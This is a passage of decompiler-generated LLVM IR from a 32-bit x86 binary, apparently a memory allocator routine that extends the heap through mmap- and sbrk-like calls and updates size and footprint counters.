  %v5_8052e76 = sub i32 %v1_8052e71, %v1_8052f68
  store i32 %v5_8052e76, i32* %esi.global-to-local, align 4
  store i32 %v3_8052e6e, i32* %v2_8052e50, align 4
  %v0_8052e7d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052e7d = load i32, i32* %eax.global-to-local, align 4
  %v2_8052e7d = add i32 %v1_8052e7d, 8
  %v3_8052e7d = inttoptr i32 %v2_8052e7d to i32*
  store i32 %v0_8052e7d, i32* %v3_8052e7d, align 4
  %v0_8052e80 = load i32, i32* %esi.global-to-local, align 4
  %tmp127 = icmp ult i32 %v0_8052e80, 16
  br i1 %tmp127, label %dec_label_pc_8052e85, label %dec_label_pc_8052e8c

dec_label_pc_8052e85:                             ; preds = %dec_label_pc_8052e6b
  %v0_8052e85 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052e85 = load i32, i32* @edx, align 4
  %v2_8052e85 = add i32 %v0_8052e85, 4
  %v3_8052e85 = add i32 %v2_8052e85, %v1_8052e85
  %v4_8052e85 = inttoptr i32 %v3_8052e85 to i32*
  %v5_8052e85 = load i32, i32* %v4_8052e85, align 4
  %v6_8052e85 = or i32 %v5_8052e85, 1
  store i32 %v6_8052e85, i32* %v4_8052e85, align 4
  br label %dec_label_pc_8052ecb

dec_label_pc_8052e8c:                             ; preds = %dec_label_pc_8052e6b
  store i32 %v1_8052f68, i32* %eax.global-to-local, align 4
  %v0_8052e95 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8052e95 = add i32 %v0_8052e95, %v1_8052f68
  store i32 %v2_8052e95, i32* @edx, align 4
  %v1_8052e98 = load i32, i32* @ebp, align 4
  %v2_8052e98 = add i32 %v1_8052e98, 8
  %v3_8052e98 = inttoptr i32 %v2_8052e98 to i32*
  store i32 %v2_8052e95, i32* %v3_8052e98, align 4
  %v0_8052e9b = load i32, i32* @edx, align 4
  %v1_8052e9b = load i32, i32* @ebp, align 4
  %v2_8052e9b = add i32 %v1_8052e9b, 12
  %v3_8052e9b = inttoptr i32 %v2_8052e9b to i32*
  store i32 %v0_8052e9b, i32* %v3_8052e9b, align 4
  %v0_8052e9e = load i32, i32* @edx, align 4
  %v1_8052e9e = add i32 %v0_8052e9e, 8
  %v2_8052e9e = inttoptr i32 %v1_8052e9e to i32*
  store i32 ptrtoint (i32* @global_var_8056bd4.210 to i32), i32* %v2_8052e9e, align 4
  %v0_8052ea5 = load i32, i32* @edx, align 4
  %v1_8052ea5 = add i32 %v0_8052ea5, 12
  %v2_8052ea5 = inttoptr i32 %v1_8052ea5 to i32*
  store i32 ptrtoint (i32* @global_var_8056bd4.210 to i32), i32* %v2_8052ea5, align 4
  br i1 %v6_8052c21, label %dec_label_pc_8052eb4, label %dec_label_pc_8052eae

dec_label_pc_8052eae:                             ; preds = %dec_label_pc_8052e8c
  %v0_8052eae = load i32, i32* @edx, align 4
  store i32 %v0_8052eae, i32* @global_var_8056bd0.209, align 16
  br label %dec_label_pc_8052eb4

dec_label_pc_8052eb4:                             ; preds = %dec_label_pc_8052e8c, %dec_label_pc_8052eae
  %v4_8052eb4 = or i32 %v1_8052f68, 1
  %v0_8052eb9 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_8052eb4, i32* %ebx.global-to-local, align 4
  %v1_8052ebf = or i32 %v0_8052eb9, 1
  store i32 %v1_8052ebf, i32* %eax.global-to-local, align 4
  %v1_8052ec2 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8052ec2 = add i32 %v1_8052ec2, 4
  %v3_8052ec2 = inttoptr i32 %v2_8052ec2 to i32*
  store i32 %v4_8052eb4, i32* %v3_8052ec2, align 4
  %v0_8052ec5 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052ec5 = load i32, i32* @edx, align 4
  %v3_8052ec5 = add i32 %v1_8052ec5, %v0_8052ec5
  %v4_8052ec5 = inttoptr i32 %v3_8052ec5 to i32*
  store i32 %v0_8052ec5, i32* %v4_8052ec5, align 4
  %v0_8052ec8 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052ec8 = load i32, i32* @edx, align 4
  %v2_8052ec8 = add i32 %v1_8052ec8, 4
  %v3_8052ec8 = inttoptr i32 %v2_8052ec8 to i32*
  store i32 %v0_8052ec8, i32* %v3_8052ec8, align 4
  br label %dec_label_pc_8052ecb

dec_label_pc_8052ecb:                             ; preds = %dec_label_pc_8052e85, %dec_label_pc_8052eb4
  %v0_8052ecb = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052ecb = add i32 %v0_8052ecb, 8
  store i32 %v1_8052ecb, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80532cd

dec_label_pc_8052ed3.loopexit:                    ; preds = %dec_label_pc_8052e20
  br label %dec_label_pc_8052ed3

dec_label_pc_8052ed3:                             ; preds = %dec_label_pc_8052ed3.loopexit, %dec_label_pc_8052bdb, %dec_label_pc_8052be3
  %v0_8052ed3 = load i32, i32* @global_var_8056bcc.208, align 4
  store i32 %v0_8052ed3, i32* @ebx, align 4
  %v1_8052edd = add i32 %v1_8052f68, 16
  store i32 %v1_8052edd, i32* @esi, align 4
  %v1_8052ee0 = add i32 %v0_8052ed3, 4
  %v2_8052ee0 = inttoptr i32 %v1_8052ee0 to i32*
  %v3_8052ee0 = load i32, i32* %v2_8052ee0, align 4
  %v1_8052ee7 = and i32 %v3_8052ee0, -4
  store i32 %v1_8052ee7, i32* %ecx.global-to-local, align 4
  %v7_8052eea = icmp ult i32 %v1_8052ee7, %v1_8052edd
  br i1 %v7_8052eea, label %dec_label_pc_8052f0a, label %dec_label_pc_8052eee

dec_label_pc_8052eee:                             ; preds = %dec_label_pc_8052ed3
  %v2_8052ef2 = add i32 %v0_8052ed3, %v1_8052f68
  store i32 %v2_8052ef2, i32* @edx, align 4
  %v1_8052ef5 = or i32 %v1_8052f68, 1
  store i32 %v1_8052ef5, i32* %eax.global-to-local, align 4
  store i32 %v2_8052ef2, i32* @global_var_8056bcc.208, align 4
  store i32 %v1_8052ef5, i32* %v2_8052ee0, align 4
  %v0_8052f01 = load i32, i32* %ecx.global-to-local, align 4
  %v5_8052f01 = sub i32 %v0_8052f01, %v1_8052f68
  store i32 %v5_8052f01, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805325d

dec_label_pc_8052f0a:                             ; preds = %dec_label_pc_8052ed3
  %v0_8052f0a = load i32, i32* @global_var_8056efc.213, align 4
  store i32 %v0_8052f0a, i32* %edx.global-to-local, align 4
  %v0_8052f10 = load i8, i8* @global_var_8056ba0.207, align 32
  %v1_8052f10 = and i8 %v0_8052f10, 2
  %v2_8052f10 = icmp eq i8 %v1_8052f10, 0
  br i1 %v2_8052f10, label %dec_label_pc_8052f3e, label %dec_label_pc_8052f19

dec_label_pc_8052f19:                             ; preds = %dec_label_pc_8052f0a
  store i32 ptrtoint (i8* @global_var_8056ba0.207 to i32), i32* %stack_var_-92, align 4
  %v2_8052f21 = call i32 @function_8053791(i32* bitcast (i8* @global_var_8056ba0.207 to i32*))
  store i32 ptrtoint (i8* @global_var_8056ba0.207 to i32), i32* @ebx, align 4
  %v1_8052f2b = add i32 %v1_8052f68, -7
  store i32 %v1_8052f2b, i32* %eax.global-to-local, align 4
  store i32 %v1_8052f2b, i32* %stack_var_-92, align 4
  %v1_8052f2f = call i32 @function_8052b74(i32 %v1_8052f2b)
  store i32 %v1_8052f2f, i32* %eax.global-to-local, align 4
  store i32 %v1_8052f2f, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80532cd

dec_label_pc_8052f3e:                             ; preds = %dec_label_pc_8052f0a
  %v1_8052f3e = add i32 %v0_8052f0a, -1
  store i32 %v1_8052f3e, i32* @ecx, align 4
  store i32 %v1_8052f68, i32* @ebx, align 4
  %v1_8052f49 = load i32, i32* @global_var_8056eec.214, align 4
  %v7_8052f49 = icmp ult i32 %v1_8052f68, %v1_8052f49
  br i1 %v7_8052f49, label %dec_label_pc_805300b, label %dec_label_pc_8052f55

dec_label_pc_8052f55:                             ; preds = %dec_label_pc_8052f3e
  %v0_8052f55 = load i32, i32* @global_var_8056ef0.215, align 16
  store i32 %v0_8052f55, i32* %eax.global-to-local, align 4
  %v1_8052f5a = load i32, i32* @global_var_8056ef4.216, align 4
  %v5_8052f60 = icmp slt i32 %v0_8052f55, %v1_8052f5a
  br i1 %v5_8052f60, label %dec_label_pc_8052f66, label %dec_label_pc_805300b

dec_label_pc_8052f66:                             ; preds = %dec_label_pc_8052f55
  %v2_8052f68 = add i32 %v1_8052f68, 10
  %v3_8052f68 = add i32 %v2_8052f68, %v0_8052f0a
  %v1_8052f6c = sub i32 0, %v0_8052f0a
  store i32 %v1_8052f6c, i32* %eax.global-to-local, align 4
  %v2_8052f6e = and i32 %v3_8052f68, %v1_8052f6c
  store i32 %v2_8052f6e, i32* @ebx, align 4
  %tmp128 = icmp ugt i32 %v2_8052f6e, %v1_8052f68
  br i1 %tmp128, label %dec_label_pc_8052f7a, label %dec_label_pc_805300b

dec_label_pc_8052f7a:                             ; preds = %dec_label_pc_8052f66
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8052f87 = call i32 @function_80543b8(i32 0, i32 %v2_8052f6e, i32 3, i32 34, i32 0, i32 0, i32 %v1_8052f3e, i32 %v1_8052f3e)
  store i32 %v8_8052f87, i32* %eax.global-to-local, align 4
  store i32 %v8_8052f87, i32* @edx, align 4
  %v10_8052f91 = icmp eq i32 %v8_8052f87, -1
  br i1 %v10_8052f91, label %dec_label_pc_8052f7a.dec_label_pc_805300b_crit_edge, label %dec_label_pc_8052f96

dec_label_pc_8052f7a.dec_label_pc_805300b_crit_edge: ; preds = %dec_label_pc_8052f7a
  %v0_805300b.pre = load i32, i32* @global_var_8056bcc.208, align 4
  br label %dec_label_pc_805300b

dec_label_pc_8052f96:                             ; preds = %dec_label_pc_8052f7a
  %v1_8052f98 = urem i32 %v8_8052f87, 8
  %v2_8052f98 = icmp eq i32 %v1_8052f98, 0
  store i32 %v1_8052f98, i32* %ecx.global-to-local, align 4
  br i1 %v2_8052f98, label %dec_label_pc_8052fb0, label %dec_label_pc_8052f9d

dec_label_pc_8052f9d:                             ; preds = %dec_label_pc_8052f96
  %v0_8052fa2 = load i32, i32* @ebx, align 4
  %v2_8052fa4 = sub nsw i32 8, %v1_8052f98
  store i32 %v2_8052fa4, i32* %eax.global-to-local, align 4
  %v2_8052fa6 = add i32 %v2_8052fa4, %v8_8052f87
  store i32 %v2_8052fa6, i32* @edx, align 4
  %v2_8052fa8 = sub i32 %v0_8052fa2, %v2_8052fa4
  store i32 %v2_8052fa8, i32* %esi.global-to-local, align 4
  %v2_8052faa = inttoptr i32 %v2_8052fa6 to i32*
  store i32 %v2_8052fa4, i32* %v2_8052faa, align 4
  br label %dec_label_pc_8052fb8

dec_label_pc_8052fb0:                             ; preds = %dec_label_pc_8052f96
  %v1_8052fb0 = inttoptr i32 %v8_8052f87 to i32*
  store i32 0, i32* %v1_8052fb0, align 4
  br label %dec_label_pc_8052fb8

dec_label_pc_8052fb8:                             ; preds = %dec_label_pc_8052f9d, %dec_label_pc_8052fb0
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_8052f9d ], [ @ebx, %dec_label_pc_8052fb0 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_8052fb8 = or i32 %storemerge, 2
  %v1_8052fbb = load i32, i32* @edx, align 4
  %v2_8052fbb = add i32 %v1_8052fbb, 4
  %v3_8052fbb = inttoptr i32 %v2_8052fbb to i32*
  store i32 %v1_8052fb8, i32* %v3_8052fbb, align 4
  %v0_8052fbe = load i32, i32* @global_var_8056ef0.215, align 16
  %v1_8052fc3 = add i32 %v0_8052fbe, 1
  store i32 %v1_8052fc3, i32* %eax.global-to-local, align 4
  store i32 %v1_8052fc3, i32* @global_var_8056ef0.215, align 16
  %v1_8052fc9 = load i32, i32* @global_var_8056ef8.217, align 8
  %v7_8052fcf = icmp sgt i32 %v1_8052fc3, %v1_8052fc9
  br i1 %v7_8052fcf, label %dec_label_pc_8052fd1, label %dec_label_pc_8052fd6

dec_label_pc_8052fd1:                             ; preds = %dec_label_pc_8052fb8
  store i32 %v1_8052fc3, i32* @global_var_8056ef8.217, align 8
  br label %dec_label_pc_8052fd6

dec_label_pc_8052fd6:                             ; preds = %dec_label_pc_8052fb8, %dec_label_pc_8052fd1
  %v0_8052fd6 = load i32, i32* @global_var_8056f04.218, align 4
  %v1_8052fdb = load i32, i32* @ebx, align 4
  %v2_8052fdb = add i32 %v1_8052fdb, %v0_8052fd6
  store i32 %v2_8052fdb, i32* %eax.global-to-local, align 4
  store i32 %v2_8052fdb, i32* @global_var_8056f04.218, align 4
  %v1_8052fe2 = load i32, i32* @global_var_8056f10.219, align 16
  %tmp129 = icmp ugt i32 %v2_8052fdb, %v1_8052fe2
  br i1 %tmp129, label %dec_label_pc_8052fea, label %dec_label_pc_8052fef

dec_label_pc_8052fea:                             ; preds = %dec_label_pc_8052fd6
  store i32 %v2_8052fdb, i32* @global_var_8056f10.219, align 16
  br label %dec_label_pc_8052fef

dec_label_pc_8052fef:                             ; preds = %dec_label_pc_8052fd6, %dec_label_pc_8052fea
  %v1_8052fef = load i32, i32* @global_var_8056f08.220, align 8
  %v2_8052fef = add i32 %v1_8052fef, %v2_8052fdb
  store i32 %v2_8052fef, i32* %eax.global-to-local, align 4
  %v1_8052ff5 = load i32, i32* @global_var_8056f14.221, align 4
  %tmp130 = icmp ugt i32 %v2_8052fef, %v1_8052ff5
  br i1 %tmp130, label %dec_label_pc_8053001, label %dec_label_pc_8052c52

dec_label_pc_8053001:                             ; preds = %dec_label_pc_8052fef
  store i32 %v2_8052fef, i32* @global_var_8056f14.221, align 4
  br label %dec_label_pc_8052c52

dec_label_pc_805300b:                             ; preds = %dec_label_pc_8052f66, %dec_label_pc_8052f7a.dec_label_pc_805300b_crit_edge, %dec_label_pc_8052f55, %dec_label_pc_8052f3e
  %v0_805300b = phi i32 [ %v0_805300b.pre, %dec_label_pc_8052f7a.dec_label_pc_805300b_crit_edge ], [ %v0_8052ed3, %dec_label_pc_8052f55 ], [ %v0_8052ed3, %dec_label_pc_8052f66 ], [ %v0_8052ed3, %dec_label_pc_8052f3e ]
  store i32 %v0_805300b, i32* %eax.global-to-local, align 4
  %v1_8053014 = add i32 %v0_805300b, 4
  %v2_8053014 = inttoptr i32 %v1_8053014 to i32*
  %v3_8053014 = load i32, i32* %v2_8053014, align 4
  %v1_805301e = and i32 %v3_8053014, -4
  %v2_805301e = icmp eq i32 %v1_805301e, 0
  store i32 %v1_805301e, i32* @ebp, align 4
  %v1_8053021 = load i32, i32* @global_var_8056ee8.222, align 8
  %v2_8053021 = add i32 %v1_8053021, %v1_8052edd
  store i32 %v2_8053021, i32* %eax.global-to-local, align 4
  %v0_8053027 = load i8, i8* @global_var_8056f00.223, align 256
  %v1_8053027 = urem i8 %v0_8053027, 2
  %v2_8053027 = icmp eq i8 %v1_8053027, 0
  br i1 %v2_8053027, label %dec_label_pc_8053032, label %dec_label_pc_8053030

dec_label_pc_8053030:                             ; preds = %dec_label_pc_805300b
  %v2_8053030 = sub i32 %v2_8053021, %v1_805301e
  store i32 %v2_8053030, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053032

dec_label_pc_8053032:                             ; preds = %dec_label_pc_805300b, %dec_label_pc_8053030
  %v0_8053036 = phi i32 [ %v2_8053021, %dec_label_pc_805300b ], [ %v2_8053030, %dec_label_pc_8053030 ]
  %v5_8053036 = add i32 %v0_8053036, %v1_8052f3e
  store i32 %v5_8053036, i32* %eax.global-to-local, align 4
  %v1_805303a = sub i32 0, %v0_8052f0a
  store i32 %v1_805303a, i32* @edx, align 4
  %v2_8053042 = and i32 %v5_8053036, %v1_805303a
  store i32 %v2_8053042, i32* @esi, align 4
  %tmp91 = icmp slt i32 %v2_8053042, 1
  br i1 %tmp91, label %dec_label_pc_805305c, label %dec_label_pc_8053046

dec_label_pc_8053046:                             ; preds = %dec_label_pc_8053032
  store i32 %v2_8053042, i32* %stack_var_-92, align 4
  %v1_805304a = call i32 @function_8054869(i32 %v2_8053042)
  store i32 %v1_805304a, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  store i32 %v1_805304a, i32* @ebx, align 4
  %v10_8053057 = icmp eq i32 %v1_805304a, -1
  %v1_805305a = icmp eq i1 %v10_8053057, false
  br i1 %v1_805305a, label %dec_label_pc_80530b2.dec_label_pc_80530bb_crit_edge, label %dec_label_pc_8053046.dec_label_pc_805305c_crit_edge

dec_label_pc_8053046.dec_label_pc_805305c_crit_edge: ; preds = %dec_label_pc_8053046
  %v0_805305c.pre = load i8, i8* @global_var_8056f00.223, align 256
  br label %dec_label_pc_805305c

dec_label_pc_805305c:                             ; preds = %dec_label_pc_8053046.dec_label_pc_805305c_crit_edge, %dec_label_pc_8053032
  %v0_8053088 = phi i32 [ -1, %dec_label_pc_8053046.dec_label_pc_805305c_crit_edge ], [ %v1_805303a, %dec_label_pc_8053032 ]
  %v0_805305c = phi i8 [ %v0_805305c.pre, %dec_label_pc_8053046.dec_label_pc_805305c_crit_edge ], [ %v0_8053027, %dec_label_pc_8053032 ]
  %v1_805305c = urem i8 %v0_805305c, 2
  %v2_805305c = icmp eq i8 %v1_805305c, 0
  br i1 %v2_805305c, label %dec_label_pc_805305c.dec_label_pc_8053071_crit_edge, label %dec_label_pc_8053065

dec_label_pc_805305c.dec_label_pc_8053071_crit_edge: ; preds = %dec_label_pc_805305c
  %v0_8053071.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8053071

dec_label_pc_8053065:                             ; preds = %dec_label_pc_805305c
  %v2_8053069 = add i32 %v1_805301e, %v1_8052f3e
  store i32 %v2_8053069, i32* %eax.global-to-local, align 4
  %v0_805306b = load i32, i32* @esi, align 4
  %v2_805306b = add i32 %v0_805306b, %v2_8053069
  %v5_805306d = and i32 %v2_805306b, %v1_805303a
  store i32 %v5_805306d, i32* @esi, align 4
  br label %dec_label_pc_8053071

dec_label_pc_8053071:                             ; preds = %dec_label_pc_805305c.dec_label_pc_8053071_crit_edge, %dec_label_pc_8053065
  %v0_8053071 = phi i32 [ %v0_8053071.pre, %dec_label_pc_805305c.dec_label_pc_8053071_crit_edge ], [ %v5_805306d, %dec_label_pc_8053065 ]
  %tmp131 = icmp ult i32 %v0_8053071, 1048576
  br i1 %tmp131, label %dec_label_pc_8053079, label %dec_label_pc_805307e

dec_label_pc_8053079:                             ; preds = %dec_label_pc_8053071
  store i32 1048576, i32* @esi, align 4
  br label %dec_label_pc_805307e

dec_label_pc_805307e:                             ; preds = %dec_label_pc_8053071, %dec_label_pc_8053079
  %v0_8053092 = phi i32 [ %v0_8053071, %dec_label_pc_8053071 ], [ 1048576, %dec_label_pc_8053079 ]
  %tmp132 = icmp ugt i32 %v0_8053092, %v1_8052f68
  br i1 %tmp132, label %dec_label_pc_8053088, label %dec_label_pc_80532c0

dec_label_pc_8053088:                             ; preds = %dec_label_pc_805307e
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8053095 = call i32 @function_80543b8(i32 0, i32 %v0_8053092, i32 3, i32 34, i32 0, i32 0, i32 %v0_8053088, i32 %v0_8053088)
  store i32 %v8_8053095, i32* %eax.global-to-local, align 4
  store i32 %v8_8053095, i32* @ebx, align 4
  %v10_805309f = icmp eq i32 %v8_8053095, -1
  br i1 %v10_805309f, label %dec_label_pc_80532c0, label %dec_label_pc_80530b2.thread

dec_label_pc_80530b2.thread:                      ; preds = %dec_label_pc_8053088
  %v0_80530a8 = load i8, i8* @global_var_8056f00.223, align 1
  %v2_80530a8 = and i8 %v0_80530a8, -2
  store i8 %v2_80530a8, i8* @global_var_8056f00.223, align 256
  %v1_80530af = load i32, i32* @esi, align 4
  %v2_80530af = add i32 %v1_80530af, %v8_8053095
  store i32 %v2_80530af, i32* @edx, align 4
  br label %dec_label_pc_80530bb

dec_label_pc_80530b2.dec_label_pc_80530bb_crit_edge: ; preds = %dec_label_pc_8053046
  %v1_80530bf.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80530bb

dec_label_pc_80530bb:                             ; preds = %dec_label_pc_80530b2.dec_label_pc_80530bb_crit_edge, %dec_label_pc_80530b2.thread
  %v1_80530bf = phi i32 [ %v1_80530af, %dec_label_pc_80530b2.thread ], [ %v1_80530bf.pre, %dec_label_pc_80530b2.dec_label_pc_80530bb_crit_edge ]
  %v0_805318794 = phi i32 [ %v8_8053095, %dec_label_pc_80530b2.thread ], [ %v1_805304a, %dec_label_pc_80530b2.dec_label_pc_80530bb_crit_edge ]
  %v0_805317993 = phi i32 [ %v2_80530af, %dec_label_pc_80530b2.thread ], [ -1, %dec_label_pc_80530b2.dec_label_pc_80530bb_crit_edge ]
  %v0_80530bf = load i32, i32* @global_var_8056f08.220, align 8
  %v2_80530bf = add i32 %v1_80530bf, %v0_80530bf
  store i32 %v2_80530bf, i32* @global_var_8056f08.220, align 8
  %v2_80530c5 = add i32 %v1_805301e, %v0_805300b
  store i32 %v2_80530c5, i32* %ecx.global-to-local, align 4
  %v2_80530c7 = sub i32 %v0_805318794, %v2_80530c5
  %v7_80530c7 = icmp ult i32 %v0_805318794, %v2_80530c5
  %v12_80530c7 = icmp eq i32 %v2_80530c7, 0
  %v1_80530c9 = icmp eq i1 %v12_80530c7, false
  br i1 %v1_80530c9, label %dec_label_pc_80530e2, label %dec_label_pc_80530cb

dec_label_pc_80530cb:                             ; preds = %dec_label_pc_80530bb
  %v10_80530cb = icmp eq i32 %v0_805317993, -1
  %v1_80530ce = icmp eq i1 %v10_80530cb, false
  br i1 %v1_80530ce, label %dec_label_pc_80530e2, label %dec_label_pc_80530d0

dec_label_pc_80530d0:                             ; preds = %dec_label_pc_80530cb
  %v2_80530d0 = add i32 %v1_80530bf, %v1_805301e
  store i32 %v0_805300b, i32* %ecx.global-to-local, align 4
  %v1_80530d7 = or i32 %v2_80530d0, 1
  store i32 %v1_80530d7, i32* %eax.global-to-local, align 4
  store i32 %v1_80530d7, i32* %v2_8053014, align 4
  br label %dec_label_pc_805320f

dec_label_pc_80530e2:                             ; preds = %dec_label_pc_80530cb, %dec_label_pc_80530bb
  %v0_80530e2 = load i8, i8* @global_var_8056f00.223, align 1
  %v1_80530e2 = sext i8 %v0_80530e2 to i32
  store i32 %v1_80530e2, i32* %eax.global-to-local, align 4
  %v2_80530e7 = urem i8 %v0_80530e2, 2
  %v3_80530e7 = icmp eq i8 %v2_80530e7, 0
  br i1 %v3_80530e7, label %dec_label_pc_80530fb, label %dec_label_pc_80530eb

dec_label_pc_80530eb:                             ; preds = %dec_label_pc_80530e2
  br i1 %v2_805301e, label %dec_label_pc_80530fb, label %dec_label_pc_80530ef

dec_label_pc_80530ef:                             ; preds = %dec_label_pc_80530eb
  %v1_80530f1 = icmp eq i1 %v7_80530c7, false
  br i1 %v1_80530f1, label %dec_label_pc_80530fb, label %dec_label_pc_80530f3

dec_label_pc_80530f3:                             ; preds = %dec_label_pc_80530ef
  %v1_80530f3 = and i32 %v1_80530e2, -2
  %v4_80530f3 = trunc i32 %v1_80530f3 to i8
  store i32 %v1_80530f3, i32* %eax.global-to-local, align 4
  store i8 %v4_80530f3, i8* @global_var_8056f00.223, align 256
  br label %dec_label_pc_80530fb

dec_label_pc_80530fb:                             ; preds = %dec_label_pc_80530ef, %dec_label_pc_80530eb, %dec_label_pc_80530e2, %dec_label_pc_80530f3
  %v0_80530fb = phi i8 [ %v0_80530e2, %dec_label_pc_80530ef ], [ %v0_80530e2, %dec_label_pc_80530eb ], [ %v0_80530e2, %dec_label_pc_80530e2 ], [ %v4_80530f3, %dec_label_pc_80530f3 ]
  %v1_80530fb = urem i8 %v0_80530fb, 2
  %v2_80530fb = icmp eq i8 %v1_80530fb, 0
  br i1 %v2_80530fb, label %dec_label_pc_8053179, label %dec_label_pc_8053104

dec_label_pc_8053104:                             ; preds = %dec_label_pc_80530fb
  br i1 %v2_805301e, label %dec_label_pc_8053112, label %dec_label_pc_8053108

dec_label_pc_8053108:                             ; preds = %dec_label_pc_8053104
  store i32 %v2_80530c7, i32* %eax.global-to-local, align 4
  %v2_805310c = add i32 %v2_80530bf, %v2_80530c7
  store i32 %v2_805310c, i32* @global_var_8056f08.220, align 8
  br label %dec_label_pc_8053112

dec_label_pc_8053112:                             ; preds = %dec_label_pc_8053104, %dec_label_pc_8053108
  %v1_8053114 = urem i32 %v0_805318794, 8
  %v2_8053114 = icmp eq i32 %v1_8053114, 0
  store i32 %v1_8053114, i32* %edx.global-to-local, align 4
  %v1_8053117 = icmp eq i1 %v2_8053114, false
  br i1 %v1_8053117, label %dec_label_pc_805311f, label %dec_label_pc_8053119

dec_label_pc_8053119:                             ; preds = %dec_label_pc_8053112
  store i32 %v0_805318794, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053129

dec_label_pc_805311f:                             ; preds = %dec_label_pc_8053112
  %v2_8053124 = sub nsw i32 8, %v1_8053114
  store i32 %v2_8053124, i32* %eax.global-to-local, align 4
  %v2_8053126 = add i32 %v2_8053124, %v0_805318794
  store i32 %v2_8053126, i32* @edi, align 4
  br label %dec_label_pc_8053129

dec_label_pc_8053129:                             ; preds = %dec_label_pc_8053119, %dec_label_pc_805311f
  %v0_805312c = phi i32 [ 0, %dec_label_pc_8053119 ], [ %v2_8053124, %dec_label_pc_805311f ]
  %v2_8053129 = add i32 %v1_80530bf, %v0_805318794
  %v2_805312c = add i32 %v0_805312c, %v1_805301e
  store i32 %v2_805312c, i32* %ecx.global-to-local, align 4
  %v2_8053135 = add i32 %v2_805312c, %v2_8053129
  store i32 %v2_8053135, i32* %edx.global-to-local, align 4
  %v2_805313b = add i32 %v2_8053135, %v1_8052f3e
  %v5_805313e = and i32 %v2_805313b, %v1_805303a
  %v2_8053145 = sub i32 %v5_805313e, %v2_8053135
  store i32 %v2_8053145, i32* %eax.global-to-local, align 4
  %v2_8053147 = add i32 %v2_8053145, %v2_805312c
  store i32 %v2_8053147, i32* @esi, align 4
  store i32 %v2_8053147, i32* %stack_var_-92, align 4
  %v1_805314b = call i32 @function_8054869(i32 %v2_8053147)
  store i32 %v1_805314b, i32* %eax.global-to-local, align 4
  store i32 %v1_805314b, i32* @edx, align 4
  %v10_8053155 = icmp eq i32 %v1_805314b, -1
  %v1_8053158 = icmp eq i1 %v10_8053155, false
  br i1 %v1_8053158, label %dec_label_pc_8053168, label %dec_label_pc_805315a

dec_label_pc_805315a:                             ; preds = %dec_label_pc_8053129
  store i32 0, i32* %stack_var_-92, align 4
  %v1_805315f = call i32 @function_8054869(i32 0)
  store i32 %v1_805315f, i32* %eax.global-to-local, align 4
  store i32 %v1_805315f, i32* @edx, align 4
  br label %dec_label_pc_805319c

dec_label_pc_8053168:                             ; preds = %dec_label_pc_8053129
  %v1_8053168 = load i32, i32* @ebx, align 4
  %v7_8053168 = icmp ult i32 %v1_805314b, %v1_8053168
  %v1_805316a = icmp eq i1 %v7_8053168, false
  br i1 %v1_805316a, label %dec_label_pc_80531a1, label %dec_label_pc_805316c

dec_label_pc_805316c:                             ; preds = %dec_label_pc_8053168
  %v0_805316c = load i8, i8* @global_var_8056f00.223, align 1
  %v2_805316c = and i8 %v0_805316c, -2
  store i8 %v2_805316c, i8* @global_var_8056f00.223, align 256
  store i32 %v2_8053129, i32* @edx, align 4
  br label %dec_label_pc_8053180

dec_label_pc_8053179:                             ; preds = %dec_label_pc_80530fb
  %v10_8053179 = icmp eq i32 %v0_805317993, -1
  br i1 %v10_8053179, label %dec_label_pc_8053184, label %dec_label_pc_805317e

dec_label_pc_805317e:                             ; preds = %dec_label_pc_8053179
  store i32 %v0_805318794, i32* @edi, align 4
  br label %dec_label_pc_8053180

dec_label_pc_8053180:                             ; preds = %dec_label_pc_805316c, %dec_label_pc_805317e
  %v0_80531a158 = phi i32 [ %v2_8053129, %dec_label_pc_805316c ], [ %v0_805317993, %dec_label_pc_805317e ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_80531a1

dec_label_pc_8053184:                             ; preds = %dec_label_pc_8053179
  store i32 %v0_805318794, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_805318b = call i32 @function_8054869(i32 0)
  store i32 %v1_805318b, i32* @edx, align 4
  %v1_8053192 = load i32, i32* @ebx, align 4
  %v2_8053192 = sub i32 %v1_805318b, %v1_8053192
  %v1_8053194 = load i32, i32* @esi, align 4
  %v2_8053194 = sub i32 %v2_8053192, %v1_8053194
  store i32 %v2_8053194, i32* %eax.global-to-local, align 4
  %v0_8053196 = load i32, i32* @global_var_8056f08.220, align 8
  %v2_8053196 = add i32 %v0_8053196, %v2_8053194
  store i32 %v2_8053196, i32* @global_var_8056f08.220, align 8
  br label %dec_label_pc_805319c

dec_label_pc_805319c:                             ; preds = %dec_label_pc_805315a, %dec_label_pc_8053184
  %v0_80531a157 = phi i32 [ %v1_805315f, %dec_label_pc_805315a ], [ %v1_805318b, %dec_label_pc_8053184 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_80531a1

dec_label_pc_80531a1:                             ; preds = %dec_label_pc_8053168, %dec_label_pc_8053180, %dec_label_pc_805319c
  %v0_80531a6 = phi i32 [ %v1_805314b, %dec_label_pc_8053168 ], [ %v0_80531a158, %dec_label_pc_8053180 ], [ %v0_80531a157, %dec_label_pc_805319c ]
  %v10_80531a1 = icmp eq i32 %v0_80531a6, -1
  br i1 %v10_80531a1, label %dec_label_pc_805320f, label %dec_label_pc_80531a6

dec_label_pc_80531a6:                             ; preds = %dec_label_pc_80531a1
  %v1_80531a6 = load i32, i32* @edi, align 4
  %v2_80531a6 = sub i32 %v0_80531a6, %v1_80531a6
